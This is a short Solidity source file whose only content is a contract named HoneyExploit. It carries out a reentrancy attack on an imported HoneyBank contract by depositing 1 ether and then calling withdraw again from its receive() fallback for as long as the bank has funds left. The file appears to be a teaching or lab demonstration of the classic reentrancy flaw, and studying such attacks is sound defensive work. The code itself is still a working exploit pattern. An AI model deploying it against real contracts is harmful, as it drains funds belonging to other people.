// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

import "./HoneyBank.sol";

contract HoneyExploit {
    uint256 constant PAY_AMOUNT = 1 ether;

    HoneyBank bank;

    function attack(HoneyBank _bank) public payable {
        require(msg.value == PAY_AMOUNT);
        bank = _bank;
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (bank.getBalance() >= PAY_AMOUNT) {
            bank.withdraw();
        }
    }
}
